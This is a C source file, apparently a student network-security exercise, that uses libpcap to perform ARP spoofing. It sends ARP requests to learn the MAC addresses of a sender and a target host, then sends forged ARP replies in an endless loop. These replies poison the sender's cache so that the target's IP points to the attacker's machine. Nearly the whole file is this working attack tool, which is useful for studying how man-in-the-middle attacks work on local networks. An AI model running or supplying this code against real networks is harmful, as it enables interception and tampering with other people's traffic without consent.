#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include<string.h>
#include<arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include<unistd.h>
#include<wait.h>
#include<stdlib.h>


#define ETHER_ADDR_LEN	6
#define SIZE_ETHERNET 14
void get_mac_addr(u_char *mac_addr);
void get_ip_addr(const char * ifr, unsigned char * out);
void make_arp_request(struct arp_request *arp_r,struct in_addr sender_ip,struct in_addr target_ip );
void usage();
void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pcap_t *handle);
void send_arp_spoof_reply(struct arp_request *arp_r,u_char *sender_mac,struct in_addr sender_ip, u_char *target_mac , struct in_addr my_IP,pcap_t *handle );

#pragma pack(1)
/* Ethernet header */
    struct sniff_ethernet {
        u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
        u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
        u_short ether_type; /* IP? ARP? RARP? etc */
    };

    /* IP header */
   struct arp_packet{
       u_short hw_type;
       u_short pro_type;
       u_char hw_size;
       u_char pro_size;
       u_short opcode;
       u_int8_t s_hw_mac[6];
       struct in_addr s_ip;
       u_int8_t d_hw_mac[10];
   };
   struct arp_request{
       u_char ether_dhost[ETHER_ADDR_LEN]; /* Destination host address */
       u_char ether_shost[ETHER_ADDR_LEN]; /* Source host address */
       u_short ether_type; /* IP? ARP? RARP? etc */
       u_short hw_type;
       u_short pro_type;
       u_char hw_size;
       u_char pro_size;
       u_short opcode;
       u_int8_t s_hw_mac[6];
       struct in_addr s_ip;
       u_int8_t d_hw_mac[10];
       u_char padding[18];
   };
#pragma pack(4)

int main(int argc, char* argv[]) {
    const struct sniff_ethernet *ethernet; /* The ethernet header */
    const struct arp_packet *arp;
    struct arp_request arp_r;
    u_char arp_buff[sizeof(struct arp_request)];
    struct in_addr sender_ip, target_ip,my_ip;
    u_char my_IP[4];

    u_char sender_mac[6],target_mac[6];
    u_char my_mac[6];
    int stat=0;
    char c;
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];





    
    pid_t pid;
    int status;
    
    if (argc != 4) {
      usage();
      return -1;
    }


    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }




    stat = inet_aton(argv[2],&sender_ip);
    if(!stat){
        printf("sender_ip Format Error\n");
        return -1;
    }
    printf("%x\n%s\n",sender_ip,inet_ntoa(sender_ip));
     stat = inet_aton(argv[3],&target_ip);
     if(!stat){

        printf("target_ip Format Error\n");
        return -1;
    }

    get_ip_addr(argv[1],my_IP);

    for(int i=0;i<4;i++){
        printf("%d",my_IP[i]);
    }
    printf("\n\n");
    memcpy(&my_ip.s_addr,my_IP,4);

    printf("%x\n%s\n",target_ip,inet_ntoa(target_ip));

    make_arp_request(&arp_r,my_ip,sender_ip);
    memcpy(arp_buff,&arp_r,sizeof(struct arp_request));
    get_other_mac(arp_buff,sender_mac,sender_ip,handle);
    for(int i=0;i<6;i++){
        printf("%x:",sender_mac[i]);

    }
    printf("\n\n");
    make_arp_request(&arp_r,my_ip,target_ip);
    memcpy(arp_buff,&arp_r,sizeof(struct arp_request));

    get_other_mac(arp_buff,target_mac,target_ip,handle);
    for(int i=0;i<6;i++){
        printf("%x:",target_mac[i]);

    }
    printf("\n\n");


    get_mac_addr(my_mac);
    send_arp_spoof_reply(&arp_r ,sender_mac,sender_ip,my_mac,target_ip,handle);
    
    
    /*
    pid=fork();


    if(pid>0){
        while(1){
            usleep(500000);

             pcap_sendpacket(handle,arp_buff,sizeof(struct arp_request))    ;
             if(waitpid(0,&status,WNOHANG))break;
    
        }
    }else{

        while(1){
            struct pcap_pkthdr* header;
            const u_char* packet;


            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            //printf("%u bytes captured\n", header->caplen);


            ethernet = (struct sniff_ethernet*)(packet);
           //  printf("%x\n",ntohs(ethernet->ether_type));
            if(ntohs(ethernet->ether_type)==0x0806)  {
                    arp = (struct arp_packet *)(packet+14);
                    if(ntohs(arp->opcode)==0x0002&&(arp->s_ip.s_addr)==sender_ip.s_addr){
                        memcpy(sender_mac,arp->s_hw_mac,6);


                        printf("succes to get sender mac\n sender mac: ");
                        for(int i=0;i<6;i++)  printf("%x:",sender_mac[i]);
                        printf("\n\n");

                        return 0;

                    }


            }else continue;


        }


    }

  */
}





void usage() {
  printf("syntax: arp_send <interface> <sender_ip> <target_ip>\n");
  printf("sample: pcap_test wlan0 192.168.0.1 192.168.0.3\n");
}
void make_arp_request(struct arp_request *arp_r,struct in_addr sender_ip,struct in_addr target_ip ){
    u_char mac_addr[6];

    for(int i=0;i<6;i++){
     arp_r->ether_dhost[i]='\xff';
    }


   get_mac_addr(mac_addr);
   memcpy(arp_r->ether_shost,mac_addr,6);

    //check
   for(int i=0;i<6;i++){
       printf("%x:",arp_r->ether_shost[i]);

   }
   printf("\n");
   for(int i=0;i<6;i++){
       printf("%x:",arp_r->ether_dhost[i]);

   }
   printf("\n\n");

   arp_r->ether_type = htons(0x0806);

   arp_r->hw_type=htons(0x0001);
   arp_r->pro_type=htons(0x0800);
   arp_r->hw_size=0x06;
   arp_r->pro_size=0x04;
   arp_r->opcode=htons(0x0001);
   memcpy(arp_r->s_hw_mac,arp_r->ether_shost,6);
   arp_r->s_ip = sender_ip;
   memset(arp_r->d_hw_mac,0,6);
   memcpy(&(arp_r->d_hw_mac[6]),&target_ip,4);
   memset(arp_r->padding,0x00,18);

   int k=0;
   u_char packet[sizeof(struct arp_request)];
   memcpy(packet,arp_r,sizeof(struct arp_request));

   for(int i=0;i < sizeof(struct arp_request);i++){
       printf("%02x ", packet[i]);
       k++;
       if(k%16==0)printf("\n");
   }
    printf("\n\n");


}

void get_mac_addr(u_char *mac_addr){

    struct ifreq ifr;
        struct ifconf ifc;
        char buf[1024];
        int success = 0;

        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
        if (sock == -1) { /* handle error*/ };

        ifc.ifc_len = sizeof(buf);
        ifc.ifc_buf = buf;
        if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

        struct ifreq* it = ifc.ifc_req;
        const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

        for (; it != end; ++it) {
            strcpy(ifr.ifr_name, it->ifr_name);
            if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
                if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                        success = 1;
                        break;
                    }
                }
            }
            else { /* handle error */ }
        }


        if (success) memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
}

void get_ip_addr(const char * ifr, unsigned char * out) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, ifr);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror( "ioctl() SIOCGIFADDR error");

    }
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));




}
void get_other_mac(u_char *arp_buff,u_char *mac_buff,struct in_addr other_ip,pcap_t *handle){
    int fds[2];
    pid_t pid;
    int status;
    const struct sniff_ethernet *ethernet; /* The ethernet header */
    const struct arp_packet *arp;

    pipe(fds);
    pid=fork();


    if(pid>0){
        while(1){
            usleep(500000);

             pcap_sendpacket(handle,arp_buff,sizeof(struct arp_request))    ;

             if(waitpid(0,&status,WNOHANG)){
                 printf("child is stopped\n\n");
                 read(fds[0],mac_buff,6);
                break;
                }
        }
    }else if(pid==0){
        printf("\ni amd child\n\n");

        while(1){

            struct pcap_pkthdr* header;
            const u_char* packet;


            int res = pcap_next_ex(handle, &header, &packet);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;
            //printf("%u bytes captured\n", header->caplen);


            ethernet = (struct sniff_ethernet*)(packet);
           //  printf("%x\n",ntohs(ethernet->ether_type));
            if(ntohs(ethernet->ether_type)==0x0806)  {
                    arp = (struct arp_packet *)(packet+14);
                    if(ntohs(arp->opcode)==0x0002&&(arp->s_ip.s_addr)==other_ip.s_addr){
                        memcpy(mac_buff,arp->s_hw_mac,6);


                        printf("succes to get sender mac\nsender mac: ");
                        for(int i=0;i<6;i++)  printf("%02x:",mac_buff[i]);
                        printf("\n\n");

                        write(fds[1],mac_buff,6);

                        exit(0);

                    }


            }else {
                printf("forkerror!\n\n");
                continue;

            }


        }


    }
}


void send_arp_spoof_reply(struct arp_request *arp_r,u_char *sender_mac,struct in_addr sender_ip, u_char *my_mac , struct in_addr target_ip,pcap_t *handle ){
     u_char arp_buff[sizeof(struct arp_request)];


   memcpy(arp_r->ether_dhost,sender_mac,6);
   for(int i=0;i<6;i++){
       printf("%x:",arp_r->ether_dhost[i]);

   }


   memcpy(arp_r->ether_shost,my_mac,6);

    //check
   for(int i=0;i<6;i++){
       printf("%02x:",arp_r->ether_shost[i]);

   }



   arp_r->ether_type = htons(0x0806);

   arp_r->hw_type=htons(0x0001);
   arp_r->pro_type=htons(0x0800);
   arp_r->hw_size=0x06;
   arp_r->pro_size=0x04;
   arp_r->opcode=htons(0x0002);
   memcpy(arp_r->s_hw_mac,arp_r->ether_shost,6);
   arp_r->s_ip = target_ip;
   memcpy(arp_r->d_hw_mac,sender_mac,6);
   memcpy(&(arp_r->d_hw_mac[6]),&sender_ip,4);
   memset(arp_r->padding,0x00,18);


   memcpy(arp_buff,arp_r,sizeof(struct arp_request));
   while(1){
      sleep(4);

       pcap_sendpacket(handle,arp_buff,sizeof(struct arp_request)) ;
       int k=0;

       for(int i=0;i < sizeof(struct arp_request);i++){
           printf("%02x ", arp_buff[i]);
           k++;
           if(k%16==0)printf("\n");
       }
        printf("\n\n");

    }
}
